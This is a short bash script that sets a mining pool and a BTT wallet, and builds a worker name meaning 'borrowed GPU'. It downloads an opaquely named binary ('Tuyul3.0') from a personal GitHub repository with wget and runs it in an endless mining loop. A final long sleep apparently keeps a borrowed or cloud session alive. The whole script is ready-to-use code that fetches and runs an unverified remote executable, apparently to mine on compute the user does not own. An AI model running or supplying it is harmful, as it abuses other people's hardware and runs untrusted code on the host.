#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=BTT:TAMRs3G2DqEwWQaqm5oqNmRAvJ7L6LuE63
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
wget https://github.com/dedeybo/Project/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
